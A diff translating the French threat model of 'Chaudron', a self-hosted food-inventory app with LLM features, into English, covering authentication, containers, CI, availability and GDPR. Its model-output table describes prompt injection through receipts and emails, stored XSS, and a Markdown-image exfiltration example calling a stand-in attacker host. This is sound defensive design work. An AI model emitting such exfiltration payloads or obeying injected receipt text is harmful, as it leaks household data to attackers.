-| Sortie contenant une URL ou une image distante | Exfiltration passive : un `![](https://attaquant/?data=…)` rendu appelle l'attaquant depuis le navigateur de la victime | — | **Non traité.** Aucune ressource distante ne doit être chargée depuis un contenu produit par un modèle. |
-| **Fausse information allergène** | **Conséquence physique** | « Ne jamais présenter une information allergène issue d'un modèle comme faisant autorité » | Il n'existe pas de mécanisme. Une phrase dans un document ne survit pas à l'écran de recette. Il faut un contrôle produit explicite : les allergènes viennent d'Open Food Facts ou de la saisie, jamais du modèle, et la recette porte un avertissement non désactivable. |
-| Quantités aberrantes | Stock faussé, gaspillage mesuré à tort | Bornes de schéma | À expliciter : les bornes numériques (`> 0`, plafonds réalistes) doivent être dans le schéma Pydantic, pas seulement dans les `CHECK` de la base — sinon l'erreur remonte en 500 au lieu d'un refus propre. |
-| Réponse démesurée | Saturation mémoire, coût | `CHAUDRON_LLM_MAX_TOKENS` | Ne borne que la sortie demandée, pas la réponse effectivement reçue d'un endpoint hostile (cas Ollama, §6.2). |
-| **Contenu contributif d'Open Food Facts** | Même classe, oubliée | — | **Non traité.** `product.name`, `brand`, `image_url` et `off_payload` sont **rédigés par des contributeurs anonymes** et stockés bruts. C'est exactement le même risque de rendu que la sortie de modèle, sur un chemin qu'on ne surveille pas parce qu'il n'a pas l'air d'être de l'IA. `image_url` est en outre une URL tierce qu'il ne faut pas charger directement depuis le client. |
+| Prompt injection via a receipt or an email | The model produces invented lines, or ignores its instructions | Strict output schema + **mandatory human review before writing to stock** | Human review is the real control, and it is a good one. But it protects the **write**, not the **display**: the injected text is shown to the user before they decide. |
+| Output containing HTML/JS | Stored XSS in the review screen or the recipe | Pydantic validation | Validation checks the **shape**, not the harmlessness of the content. The frontend must render any model-sourced field as **plain text**, never as HTML, never as Markdown with active links. A strict CSP, without `unsafe-inline`, is the second net. |
+| Output containing a URL or a remote image | Passive exfiltration: a rendered `![](https://attacker/?data=…)` calls the attacker from the victim's browser | — | **Not handled.** No remote resource must be loaded from model-produced content. |
+| **False allergen information** | **Physical consequence** | "Never present model-sourced allergen information as authoritative" | There is no mechanism. A sentence in a document does not survive to the recipe screen. An explicit product control is required: allergens come from Open Food Facts or from manual entry, never from the model, and the recipe carries a warning that cannot be dismissed. |
+| Absurd quantities | Falsified stock, wrongly measured waste | Schema bounds | To be made explicit: numeric bounds (`> 0`, realistic ceilings) must be in the Pydantic schema, not only in the database `CHECK`s — otherwise the error surfaces as a 500 instead of a clean rejection. |
+| Oversized response | Memory saturation, cost | `CHAUDRON_LLM_MAX_TOKENS` | Bounds only the requested output, not the response actually received from a hostile endpoint (the Ollama case, §6.2). |
+| **Open Food Facts contributed content** | Same class, forgotten | — | **Not handled.** `product.name`, `brand`, `image_url` and `off_payload` are **written by anonymous contributors** and stored raw. It is exactly the same rendering risk as model output, on a path nobody watches because it does not look like AI. `image_url` is moreover a third-party URL that must not be loaded directly from the client. |
 
-**Règle générale à retenir :** une sortie de modèle ne doit **jamais** déclencher
-d'action. Elle propose ; un humain décide ; le code écrit. Aucun champ produit
-par un modèle ne doit servir de clé de recherche non échappée, de chemin de
-fichier, d'URL appelée, ou d'argument de commande.
+**General rule to remember:** model output must **never** trigger an action. It
+proposes; a human decides; the code writes. No model-produced field must serve as
+an unescaped search key, a file path, a called URL, or a command argument.
 
 ---
 
-### 6.7 S7 — Authentification, sessions et CORS
+### 6.7 S7 — Authentication, sessions and CORS
 
-**Actifs :** A5, A6, et par conséquence tous les autres. **Attaquants :** P1, P2.
+**Assets:** A5, A6, and by consequence all the others. **Attackers:** P1, P2.
 
-La stratégie d'authentification n'est pas tranchée (`architecture.md` §8). Ce
-qui suit décrit les contraintes que la décision devra respecter.
+The authentication strategy is not settled (`architecture.md` §8). What follows
+describes the constraints the decision will have to respect.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Vol de session | Accès total à un foyer | Configuration validée au démarrage, arrêt si incomplète | Ni le mode de transport (cookie `Secure`/`HttpOnly`/`SameSite` vs jeton en mémoire), ni la révocation, ni la durée ne sont décidés. Un JWT sans liste de révocation ne se retire pas avant expiration. |
-| **Confusion d'algorithme JWT** | Forge de jetons | — | `CHAUDRON_JWT_ALGORITHM` est **une variable d'environnement**. Rendre l'algorithme configurable ouvre `none` et la confusion HMAC/RSA. L'algorithme doit être une constante du code, et la vérification doit imposer une liste d'algorithmes acceptés. |
-| Réutilisation de secret | Une fuite compromet deux fonctions | — | `CHAUDRON_SECRET_KEY` sert à la fois aux sessions et aux JWT. Deux usages, deux clés, dérivées si besoin. |
-| **Force brute / bourrage d'identifiants** | Prise de contrôle d'un compte | — | **Non traité nulle part.** Aucune limitation de débit n'est conçue : ni sur la connexion, ni sur le webhook, ni sur l'upload de ticket, ni sur la génération de recette (qui coûte de l'argent). Sur une instance auto-hébergée sans WAF, c'est l'attaque de P2 par défaut. |
-| Énumération de comptes | Cartographie des utilisateurs | — | Non traité. Réponses et délais identiques pour un email connu et inconnu, à la connexion comme à la réinitialisation. |
-| Hachage de mot de passe | Cassage hors ligne après vol de base | `password_hash` est `text`, nullable | L'algorithme n'est **pas décidé** et aucune dépendance n'est présente. Ce doit être **Argon2id**, paramétré, avec re-hachage à la connexion quand les paramètres évoluent. |
-| **CORS trop permissif** | Vol de données inter-origine | `CHAUDRON_CORS_ORIGINS` en liste explicite | `CHAUDRON_CORS_ALLOW_CREDENTIALS` existe sans garde-fou documenté. L'association `*` + `credentials: true` doit **empêcher le démarrage**, pas produire un avertissement. Aucune origine ne doit être reflétée depuis l'en-tête `Origin`. |
-| Rôles | Un `viewer` écrit | `membership_role` : `owner` / `member` / `viewer` | Aucune matrice permission × ressource n'existe. Sans elle, le rôle est décoratif. Un `member` peut-il déposer une clé d'API pour le foyer ? Question ouverte à conséquence financière. |
+| Session theft | Full access to a household | Configuration validated at startup, shutdown if incomplete | Neither the transport mode (`Secure`/`HttpOnly`/`SameSite` cookie vs in-memory token), nor revocation, nor duration are decided. A JWT with no revocation list cannot be withdrawn before expiry. |
+| **JWT algorithm confusion** | Token forgery | — | `CHAUDRON_JWT_ALGORITHM` is **an environment variable**. Making the algorithm configurable opens up `none` and HMAC/RSA confusion. The algorithm must be a code constant, and verification must enforce a list of accepted algorithms. |
+| Secret reuse | One leak compromises two functions | — | `CHAUDRON_SECRET_KEY` serves both sessions and JWTs. Two uses, two keys, derived if need be. |
+| **Brute force / credential stuffing** | Account takeover | — | **Not handled anywhere.** No rate limiting is designed: not on login, not on the webhook, not on receipt upload, not on recipe generation (which costs money). On a self-hosted instance with no WAF, this is P2's default attack. |
+| Account enumeration | Mapping of the users | — | Not handled. Identical responses and delays for a known and an unknown email, at login as at reset. |
+| Password hashing | Offline cracking after a database theft | `password_hash` is `text`, nullable | The algorithm is **not decided** and no dependency is present. It must be **Argon2id**, parameterised, with re-hashing at login when the parameters change. |
+| **Overly permissive CORS** | Cross-origin data theft | `CHAUDRON_CORS_ORIGINS` as an explicit list | `CHAUDRON_CORS_ALLOW_CREDENTIALS` exists with no documented guard rail. The pairing of `*` + `credentials: true` must **prevent startup**, not produce a warning. No origin must be reflected from the `Origin` header. |
+| Roles | A `viewer` writes | `membership_role` **enforced**: `require_member` on every state-changing route, `require_owner` on the four that hand out or accept a credential (`api/deps.py`). A machine token carries its issuer's *current* role, re-read on every request (migration `0014`), so minting one does not walk around the check. The matrix is `ROLE_GUARDED` in `tests/api/test_route_authentication.py`, asserted in both directions. | The role was decorative until this: one line of `src/` read it, on one route out of sixty-seven, and a `viewer` could register a third-party export token and consent on the household's behalf — replayed end to end. Still open, and deliberately not decided in code: whether erasing a person (`DELETE /v1/members/{id}`) and spending the household's inference budget (`POST /v1/recipes/suggest`) should be owner-only. Both are product calls, and `UNGUARDED_WRITES` names the second one. |
+| Session theft, once suspected | The victim has no remedy | `POST /v1/auth/sessions/revoke-all` and `POST /v1/auth/password`, both behind cookie + CSRF, both revoking **every** session including the caller's and rotating it (`api/routers/auth.py`) | Until these existed the only bound on a stolen cookie was the 30-day absolute expiry, and the only cure an operator with a psql prompt: `revoke_all` had been written and was called by nothing. There is still **no password reset**, because there is no SMTP — a forgotten password remains a forgotten account, and the change endpoint therefore requires the current one. |
 
 ---
 
-### 6.8 S8 — Chaîne de conteneurs et exploitation
+### 6.8 S8 — Container chain and operations
 
-**Actifs :** A2, A5, A7, A8. **Attaquants :** P2 après compromission applicative, P3.
+**Assets:** A2, A5, A7, A8. **Attackers:** P2 after an application compromise, P3.
 
-Le baseline est ici **bon** — c'est la partie la plus solide du projet. Les
-manques sont des angles, pas des trous.
+The baseline here is **good** — it is the most solid part of the project. The
+gaps are corners, not holes.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Évasion / escalade dans le conteneur | Compromission de l'hôte | Podman **rootless** ; `USER chaudron` (UID 10001 fixe) ; `NoNewPrivileges=true` ; `DropCapability=ALL` ; `ReadOnly=true` ; `Tmpfs` explicite | La base de données conserve `AddCapability=CHOWN,DAC_OVERRIDE,FOWNER,SETGID,SETUID` — nécessaire à l'entrypoint `postgres`, mais `DAC_OVERRIDE` est large. Une image `postgres` préparée avec les bons UID s'en passerait. |
-| Accès disque par un autre conteneur | Lecture de A4 et de la base | SELinux **Enforcing** ; `:Z` (label privé) sur chaque bind mount, avec la justification écrite ; interdiction explicite de `setenforce 0` ; piège `:U` documenté | — (traitement exemplaire) |
-| Exposition réseau | Base ou API atteignable depuis Internet | API sur `127.0.0.1:8000` uniquement ; base **jamais publiée**, jointe par le réseau `chaudron-net` | Le `README.md` de premier niveau propose une commande de démarrage rapide qui publie PostgreSQL sur **toutes** les interfaces. C'est le bloc le plus copié-collé d'un dépôt public. |
-| Fuite de secret par la configuration | A2, A5, A7 en clair sur disque | Secrets Podman (`type=env`), saisie masquée, transmission par stdin, `unset` final, piège du saut de ligne documenté | **`CHAUDRON_CREDENTIAL_ENCRYPTION_KEY` (A2) n'est déclarée par aucun `Secret=`.** En suivant la documentation, l'opérateur la place dans le fichier `EnvironmentFile`, en clair, dans le même répertoire personnel que les sauvegardes de la base — ce qui annule le bénéfice décrit en §6.1. Idem pour les clés OpenAI, Gemini et Mistral. |
-| Image compromise en amont | Exécution de code arbitraire | Images en deux étages, sans chaîne de compilation ni `uv` au runtime | Les images de base sont épinglées par **tag**, pas par **digest**. `AutoUpdate=registry` sur `docker.io/library/postgres:16` fait de surcroît **tirer automatiquement** une nouvelle image de base de données, sans revue et sans fenêtre de maintenance. |
-| Sauvegardes | Vol de A3, A4, A1 chiffrés | `pg_dump --format=custom`, restauration vérifiée avant migration destructrice | Les dumps ne sont ni chiffrés, ni gérés en rétention, et la commande documentée les écrit dans le répertoire courant — qui peut être le dépôt git. Le fichier de sauvegarde d'une instance et A2 vivent dans le même `$HOME`. |
+| Escape / escalation inside the container | Host compromise | **Rootless** Podman; `USER chaudron` (fixed UID 10001); `NoNewPrivileges=true`; `DropCapability=ALL`; `ReadOnly=true`; explicit `Tmpfs` | The database keeps `AddCapability=CHOWN,DAC_OVERRIDE,FOWNER,SETGID,SETUID` — necessary for the `postgres` entrypoint, but `DAC_OVERRIDE` is broad. A `postgres` image prepared with the right UIDs would do without it. |
+| Disk access by another container | Reading A4 and the database | SELinux **Enforcing**; `:Z` (private label) on every bind mount, with the justification written down; explicit ban on `setenforce 0`; `:U` pitfall documented | — (exemplary handling) |
+| Network exposure | Database or API reachable from the Internet | API on `127.0.0.1:8000` only; database **never published**, joined via the `chaudron-net` network | The top-level `README.md` offers a quick-start command that publishes PostgreSQL on **all** interfaces. It is the most copy-pasted block of a public repository. |
+| Secret leak through configuration | A2, A5, A7 in cleartext on disk | Podman secrets (`type=env`), masked entry, transmission via stdin, final `unset`, newline pitfall documented | **`CHAUDRON_CREDENTIAL_ENCRYPTION_KEY` (A2) is declared by no `Secret=`.** Following the documentation, the operator puts it in the `EnvironmentFile`, in cleartext, in the same home directory as the database backups — which cancels the benefit described in §6.1. Same for the OpenAI, Gemini and Mistral keys. |
+| Upstream-compromised image | Arbitrary code execution | Two-stage images, with no build chain and no `uv` at runtime | Base images are pinned by **tag**, not by **digest**. `AutoUpdate=registry` on `docker.io/library/postgres:16` moreover causes a new database image to be **pulled automatically**, without review and without a maintenance window. |
+| Backups | Theft of A3, A4, encrypted A1 | `pg_dump --format=custom`, restore verified before a destructive migration | The dumps are neither encrypted nor retention-managed, and the documented command writes them into the current directory — which may be the git repository. An instance's backup file and A2 live in the same `$HOME`. |
 
 ---
 
-### 6.9 S9 — Chaîne d'approvisionnement et intégration continue
+### 6.9 S9 — Supply chain and continuous integration
 
-**Actifs :** intégrité du code, A5/A7 en tant que secrets de dépôt. **Attaquant :** P5.
+**Assets:** code integrity, A5/A7 as repository secrets. **Attacker:** P5.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| **`pull_request_target`** | Exécution de code d'un fork avec les secrets du dépôt | **Le piège est évité** : le déclencheur est `pull_request`, et il n'y a ni `workflow_run` ni `pull_request_target` | — (à re-vérifier à chaque modification du workflow : c'est la régression classique) |
-| Jeton CI trop permissif | Écriture sur le dépôt depuis un job | `permissions: contents: read` au niveau du workflow | Aucun job ne réduit davantage ses permissions. `contents: read` est déjà correct pour tous. |
-| Action tierce compromise | Exécution arbitraire dans le runner | Versions majeures épinglées (`@v5`, `@v7`, `@v2`) | Un **tag est mutable**. `astral-sh/setup-uv@v7` et `gitleaks/gitleaks-action@v2` sont des actions tierces : leur épinglage par SHA complet est le seul qui protège d'un déplacement de tag. |
-| **Exécution de code non fiable sur PR de fork** | Minage, exfiltration de ce qui est joignable depuis le runner | Jeton en lecture seule et **aucun secret** exposé aux PR de fork (comportement GitHub par défaut) | Le job de construction exécute `podman build` sur un `Containerfile` **contrôlé par la PR** : les instructions `RUN` s'exécutent. L'impact est borné par l'absence de secret, mais ce n'est pas nul. Le paramètre « Require approval for all outside collaborators » doit être activé. |
-| Fuite de secret en clair dans les logs | Rotation d'urgence | `gitleaks` sur l'historique complet (`fetch-depth: 0`) ; `pip-audit --strict` sur les dépendances verrouillées ; obligations écrites dans `CONTRIBUTING.md` §4.9 et `SECURITY.md` | Les deux jobs de sécurité ne sont ni chaînés ni déclarés obligatoires ; rien ne documente la protection de branche ni les vérifications requises. Un scan qui peut être fusionné en échec ne protège pas. |
-| Vulnérabilité publiée après la fusion | Une CVE dort jusqu'à la prochaine PR | `pip-audit` sur `push` et `pull_request` | Aucune exécution **planifiée**, et pas de `dependabot.yml`. Sur un projet à faible fréquence de commits, c'est plusieurs mois d'angle mort. |
-| Dépendance hostile | Exécution à l'installation | Versions **exactement** épinglées + `uv.lock` + `UV_FROZEN` + revue d'ajout documentée | Pas de vérification d'attestation ni de SBOM. Proportionné à ce stade ; à réévaluer si le projet publie des images. |
-| Régression d'étanchéité glissée en revue | Fuite inter-foyer | Tests d'isolation obligatoires par ressource ; motifs de refus explicites dans `CONTRIBUTING.md` §6 | Une convention appliquée par un mainteneur unique. C'est un argument de plus pour le RLS (§6.3) : une politique de base ne se laisse pas convaincre en revue. |
+| **`pull_request_target`** | Execution of a fork's code with the repository's secrets | **The trap is avoided**: the trigger is `pull_request`, and there is neither `workflow_run` nor `pull_request_target` | — (to be re-verified at every change to the workflow: this is the classic regression) |
+| Overly permissive CI token | Writing to the repository from a job | `permissions: contents: read` at workflow level | No job further reduces its permissions. `contents: read` is already correct for all of them. |
+| Compromised third-party action | Arbitrary execution in the runner | Major versions pinned (`@v5`, `@v7`, `@v2`) | A **tag is mutable**. `astral-sh/setup-uv@v7` and `gitleaks/gitleaks-action@v2` are third-party actions: pinning them by full SHA is the only pinning that protects against a tag being moved. |
+| **Untrusted code execution on fork PRs** | Mining, exfiltration of whatever is reachable from the runner | Read-only token and **no secret** exposed to fork PRs (GitHub's default behaviour) | The build job runs `podman build` on a `Containerfile` **controlled by the PR**: the `RUN` instructions execute. The impact is bounded by the absence of secrets, but it is not nil. The "Require approval for all outside collaborators" setting must be enabled. |
+| Cleartext secret leaked into the logs | Emergency rotation | `gitleaks` over the full history (`fetch-depth: 0`); `pip-audit --strict` on the locked dependencies; obligations written in `CONTRIBUTING.md` §4.9 and `SECURITY.md` | The two security jobs are neither chained nor declared required; nothing documents branch protection or the required checks. A scan that can be merged while failing does not protect. |
+| Vulnerability published after the merge | A CVE sleeps until the next PR | `pip-audit` on `push` and `pull_request` | No **scheduled** run, and no `dependabot.yml`. On a project with a low commit frequency, that is several months of blind spot. |
+| Hostile dependency | Execution at install time | **Exactly** pinned versions + `uv.lock` + `UV_FROZEN` + documented review for additions | No attestation verification and no SBOM. Proportionate at this stage; to be reassessed if the project publishes images. |
+| Isolation regression slipped past review | Cross-household leak | Mandatory per-resource isolation tests; explicit grounds for rejection in `CONTRIBUTING.md` §6 | A convention enforced by a single maintainer. That is one more argument for RLS (§6.3): a database policy cannot be talked round in review. |
 
 ---
 
-### 6.10 S10 — Disponibilité et abus de ressources
+### 6.10 S10 — Availability and resource abuse
 
-**Actifs :** A11. **Attaquants :** P1, P2.
+**Assets:** A11. **Attackers:** P1, P2.
 
-| Menace | Impact concret | Contrôle retenu | Non couvert |
+| Threat | Concrete impact | Control adopted | Not covered |
 |---|---|---|---|
-| Abus du mode `instance_owner` | L'exploitant paie pour un tiers | Mode **verrouillé par défaut** ; réservé à un foyer unique garanti par index unique ; `CHAUDRON_LLM_MONTHLY_BUDGET_USD` | Aucun quota par foyer, aucune limite de débit sur la génération. Le plafond mensuel est global : atteint, il coupe la fonction pour tout le monde. |
-| Bannissement d'IP par Open Food Facts | **Coupure du service pour tous les foyers** | Cache PostgreSQL global, TTL long en *stale-while-revalidate*, cache négatif court, client unique avec limiteur à 10 req/min sous le plafond de 15, tolérance aux réponses HTML | Le plafond est **global à l'instance** : un seul foyer qui scanne en rafale peut faire bannir l'instance entière. L'import du dump est identifié comme prérequis de la phase 2, pas comme contrôle de la v1. |
-| Saturation du disque | Arrêt de l'instance | `CHAUDRON_INBOUND_EMAIL_MAX_BYTES` ; `Tmpfs=/tmp:rw,size=64M` | Aucune borne sur la taille d'un upload HTTP de ticket, ni sur le volume total par foyer. `python-multipart` déverse sur disque au-delà d'un seuil : 64 Mo de `tmpfs` face à un upload non borné est un arrêt, pas une protection. |
-| Requête coûteuse | Épuisement du pool | Index partiels bien choisis, requêtes chaudes identifiées | Pas de pagination obligatoire décrite sur les listes (`stock_movement`, `receipt_line`). |
+| Abuse of `instance_owner` mode | The operator pays for a third party | Mode **locked by default**; reserved to a single household guaranteed by a unique index; `CHAUDRON_LLM_MONTHLY_BUDGET_USD` | No per-household quota, no rate limit on generation. The monthly ceiling is global: once reached, it cuts the feature off for everybody. |
+| IP ban by Open Food Facts | **Service cut off for every household** | Global PostgreSQL cache, long TTL in *stale-while-revalidate*, short negative cache, single client with a 10 req/min limiter below the 15 ceiling, tolerance for HTML responses | The ceiling is **global to the instance**: a single household scanning in bursts can get the whole instance banned. Importing the dump is identified as a phase-2 prerequisite, not as a v1 control. |
+| Disk saturation | Instance shutdown | `CHAUDRON_INBOUND_EMAIL_MAX_BYTES`; `Tmpfs=/tmp:rw,size=64M` | No bound on the size of an HTTP receipt upload, nor on the total volume per household. `python-multipart` spills to disk beyond a threshold: 64 MB of `tmpfs` against an unbounded upload is a shutdown, not a protection. |
+| Expensive query | Pool exhaustion | Well-chosen partial indexes, hot queries identified | No mandatory pagination described on the lists (`stock_movement`, `receipt_line`). |
 
 ---
 
-## 7. Ce que l'AGPL et le dépôt public changent
+## 7. What the AGPL and the public repository change
 
-**Le code est lisible par l'attaquant. Ce n'est pas une faiblesse — c'est une
-contrainte de conception qui invalide une catégorie entière de faux contrôles.**
+**The code is readable by the attacker. This is not a weakness — it is a design
+constraint that invalidates a whole category of fake controls.**
 
-Ce qui change vraiment :
+What really changes:
 
-1. **Toute sécurité par obscurité vaut zéro, et il faut le vérifier
-   explicitement.** Un attaquant connaît le format des identifiants (UUIDv7,
-   donc ordonnés dans le temps), le schéma des clés de stockage objet, la logique
-   de validation de l'allowlist SSRF, l'algorithme de signature du webhook, la
-   liste des endpoints et le nom des variables d'environnement. Le seul élément
-   qui doit rester secret est **une valeur**, jamais un mécanisme : `CHAUDRON_SECRET_KEY`,
-   `CHAUDRON_CREDENTIAL_ENCRYPTION_KEY`, `CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY`, les
-   mots de passe, et **l'adresse email entrante d'un foyer** (§6.4) — qui doit
-   donc être aléatoire, parce que le dépôt public dira exactement comment elle
-   est construite.
+1. **Any security through obscurity is worth zero, and this must be verified
+   explicitly.** An attacker knows the format of the identifiers (UUIDv7, hence
+   time-ordered), the object storage key scheme, the SSRF allowlist validation
+   logic, the webhook signature algorithm, the list of endpoints and the names of
+   the environment variables. The only element that must remain secret is **a
+   value**, never a mechanism: `CHAUDRON_SECRET_KEY`,
+   `CHAUDRON_CREDENTIAL_ENCRYPTION_KEY`, `CHAUDRON_INBOUND_EMAIL_WEBHOOK_KEY`, the
+   passwords, and **a household's inbound email address** (§6.4) — which must
+   therefore be random, because the public repository will say exactly how it is
+   built.
 
-2. **UUIDv7 est ordonné dans le temps, et le dépôt le dit.** Un identifiant
-   exposé révèle son instant de création à la milliseconde. Ce n'est pas une
-   faille, mais deux identifiants suffisent à estimer un volume d'activité, et un
-   identifiant permet de déduire quand une personne a fait ses courses. Ne pas
-   exposer d'identifiant là où un opaque suffirait, et ne jamais présumer qu'un
-   UUID est un secret.
+2. **UUIDv7 is time-ordered, and the repository says so.** An exposed identifier
+   reveals its creation instant to the millisecond. That is not a flaw, but two
+   identifiers are enough to estimate a volume of activity, and one identifier
+   allows deducing when a person did their shopping. Do not expose an identifier
+   where an opaque one would do, and never assume that a UUID is a secret.
 
-3. **La fenêtre entre une correction et son déploiement est publique.** Un commit
-   `fix(auth): …` sur un dépôt public est une annonce de vulnérabilité pour toutes
-   les instances non mises à jour. C'est le prix de l'ouverture, et il se paie par
-   des avis de sécurité GitHub coordonnés plutôt que par des messages de commit
-   discrets — le processus est déjà décrit dans `SECURITY.md`.
+3. **The window between a fix and its deployment is public.** A `fix(auth): …`
+   commit on a public repository is a vulnerability announcement for every
+   instance that has not been updated. That is the price of openness, and it is
+   paid through coordinated GitHub security advisories rather than through
+   discreet commit messages — the process is already described in `SECURITY.md`.
 
-4. **L'attaquant peut lire les documents de conception, dont celui-ci.** La
-   colonne « Non couvert » de la §6 est une feuille de route pour P1 et P2. C'est
-   assumé : la publier accélère les correctifs plus qu'elle n'accélère les
-   attaques, et un attaquant sérieux trouve ces trous par lecture du code de toute
-   façon. La conséquence est que **cette colonne doit être vidée, pas cachée**.
+4. **The attacker can read the design documents, including this one.** The "Not
+   covered" column of §6 is a roadmap for P1 and P2. This is accepted: publishing
+   it accelerates fixes more than it accelerates attacks, and a serious attacker
+   finds these holes by reading the code anyway. The consequence is that **this
+   column must be emptied, not hidden**.
 
-5. **La CI est publique, ses logs aussi.** Tout ce qu'un job affiche est
-   consultable par le monde entier, y compris les valeurs d'environnement
-   imprimées par erreur. Les identifiants de la base de test dans le workflow
-   sont éphémères, mais l'habitude d'y écrire des valeurs en clair est le vrai
-   risque.
+5. **CI is public, and so are its logs.** Everything a job prints is readable by
+   the whole world, including environment values printed by mistake. The test
+   database credentials in the workflow are ephemeral, but the habit of writing
+   cleartext values there is the real risk.
 
-6. **Ce que l'AGPL ajoute, spécifiquement.** L'article 13 impose à quiconque
-   exploite un Chaudron **modifié** comme service réseau d'en offrir les sources à
-   ses utilisateurs. Conséquence de sécurité concrète : une instance tierce
-   modifiée qui refuse ses sources est un signal — l'utilisateur ne peut pas
-   vérifier ce que fait le code qui détient sa clé d'API (A1) et son inventaire
-   (A3). L'AGPL ne protège pas techniquement contre P3, mais elle donne à la
-   victime le droit d'auditer. Le rappeler dans l'interface est le complément
-   naturel de l'avertissement décrit en §3, P3.
+6. **What the AGPL specifically adds.** Article 13 requires anyone operating a
+   **modified** Chaudron as a network service to offer its sources to their users.
+   Concrete security consequence: a modified third-party instance that refuses its
+   sources is a signal — the user cannot verify what the code holding their API
+   key (A1) and their inventory (A3) does. The AGPL does not technically protect
+   against P3, but it gives the victim the right to audit. Restating it in the
+   interface is the natural complement to the warning described in §3, P3.
 
-7. **Les contributions deviennent une surface (P5).** Elle est déjà traitée
-   (§6.9), et la liste des motifs de refus de `CONTRIBUTING.md` §6 en est le
-   contrôle principal. Un dépôt privé n'aurait pas cette surface ; c'est le seul
-   coût de sécurité réel de l'ouverture, et il est largement compensé par la
-   relecture externe — qui est, pour un projet solo, le seul mécanisme de revue
-   qui ne soit pas l'auteur lui-même.
+7. **Contributions become a surface (P5).** It is already handled (§6.9), and the
+   list of grounds for rejection in `CONTRIBUTING.md` §6 is its main control. A
+   private repository would not have this surface; it is the only real security
+   cost of openness, and it is largely offset by external review — which is, for a
+   solo project, the only review mechanism that is not the author themselves.
 
 ---
 
-## 8. RGPD
+## 8. GDPR
 
-Chaudron est un **logiciel**, pas un service. Le responsable de traitement est
-**l'exploitant de l'instance**, jamais le projet. Cette section ne le décharge
-de rien : elle lui donne ce dont il a besoin pour tenir ses obligations, et
-liste ce que le logiciel doit fournir pour que ce soit possible.
+Chaudron is **software**, not a service. The data controller is **the instance
+operator**, never the project. This section does not discharge them of anything:
+it gives them what they need to meet their obligations, and lists what the
+software must provide to make that possible.
 
-### 8.1 Catégories de données traitées
+### 8.1 Categories of data processed
 
-| Catégorie | Où | Sensibilité |
+| Category | Where | Sensitivity |
 |---|---|---|
-| Identité | `user_account.email`, `display_name` | Données ordinaires. |
-| Authentification | `password_hash`, `last_login_at` | Ordinaires, à protéger fortement. |
-| **Consommation alimentaire** | `inventory_lot`, `stock_movement`, `receipt_line`, `stock_snapshot` | Ordinaires **en apparence**. Voir 8.2. |
-| Achats | `receipt` (commerçant, date, montant, devise), images | Ordinaires, mais fortement révélatrices par agrégation. |
-| **Images de tickets** | Stockage objet | Contiennent des données non maîtrisées : carte de fidélité, parfois nom, parfois fragments bancaires. |
-| Techniques | Journaux avec `household_id` et identifiant de requête, adresses IP au niveau du reverse proxy | Ordinaires, durée courte. |
-| Secrets de tiers | `api_key_ciphertext` | Pas des données personnelles, mais des secrets d'autrui — obligation de sécurité identique. |
+| Identity | `user_account.email`, `display_name` | Ordinary data. |
+| Authentication | `password_hash`, `last_login_at` | Ordinary, to be strongly protected. |
+| **Food consumption** | `inventory_lot`, `stock_movement`, `receipt_line`, `stock_snapshot` | Ordinary **in appearance**. See 8.2. |
+| Purchases | `receipt` (merchant, date, amount, currency), images | Ordinary, but highly revealing in aggregate. |
+| **Receipt images** | Object storage | Contain uncontrolled data: loyalty card, sometimes a name, sometimes banking fragments. |
+| Technical | Logs with `household_id` and request identifier, IP addresses at the reverse proxy level | Ordinary, short duration. |
+| Third-party secrets | `api_key_ciphertext` | Not personal data, but somebody else's secrets — identical security obligation. |
 
-### 8.2 Le point à ne pas éluder : l'article 9
+### 8.2 The point not to dodge: Article 9
 
-Un inventaire alimentaire n'est pas une donnée neutre. Des produits sans gluten
-répétés révèlent une maladie cœliaque ; des produits halal ou casher révèlent une
-conviction religieuse ; des compléments ou des substituts révèlent un état de
-santé ; l'alcool, le tabac, les produits infantiles révèlent un mode de vie et
-une composition de foyer.
+A food inventory is not neutral data. Repeated gluten-free products reveal
+coeliac disease; halal or kosher products reveal a religious belief; supplements
+or substitutes reveal a health condition; alcohol, tobacco and infant products
+reveal a lifestyle and a household composition.
 
-Chaudron ne collecte **pas** ces données comme telles, et n'en déduit rien. Mais
-`recipe_suggestion.stock_snapshot` est **l'inventaire complet d'un domicile,
-figé et conservé**, et il est envoyé à un fournisseur de modèle. Il faut donc :
+Chaudron does **not** collect these data as such, and infers nothing from them.
+But `recipe_suggestion.stock_snapshot` is **a home's complete inventory, frozen
+and retained**, and it is sent to a model provider. Hence it must:
 
-- le traiter au niveau de protection de l'article 9, même si sa qualification
-  juridique est discutable ;
-- lui donner **la durée de rétention la plus courte du système** ;
-- ne jamais l'exposer dans une interface d'administration transverse.
+- be handled at the Article 9 level of protection, even if its legal
+  qualification is debatable;
+- be given **the shortest retention period in the system**;
+- never be exposed in a cross-household administration interface.
 
-### 8.3 Bases légales
+### 8.3 Legal bases
 
-| Traitement | Base légale | Remarque |
+| Processing | Legal basis | Note |
 |---|---|---|
-| Compte, stock, listes, tickets | **Exécution du contrat** (art. 6.1.b) — c'est le service demandé | Sans ces données, il n'y a pas de produit. |
-| Journaux techniques, sécurité | **Intérêt légitime** (art. 6.1.f) | Durée courte, finalité limitée à l'exploitation. |
-| **Envoi à un fournisseur de modèle externe** | **Consentement** (art. 6.1.a), explicite, par foyer, révocable | C'est une transmission à un tiers, souvent hors UE. Elle doit être **opt-in**, jamais un défaut. Le mode `ollama` doit rester pleinement fonctionnel sans ce consentement. |
-| Cache produit Open Food Facts | Sans objet | Aucune donnée personnelle : c'est un référentiel externe partagé. C'est aussi pourquoi il n'a **pas** de `household_id`. |
+| Account, stock, lists, receipts | **Performance of the contract** (art. 6(1)(b)) — this is the requested service | Without these data there is no product. |
+| Technical and security logs | **Legitimate interest** (art. 6(1)(f)) | Short duration, purpose limited to operations. |
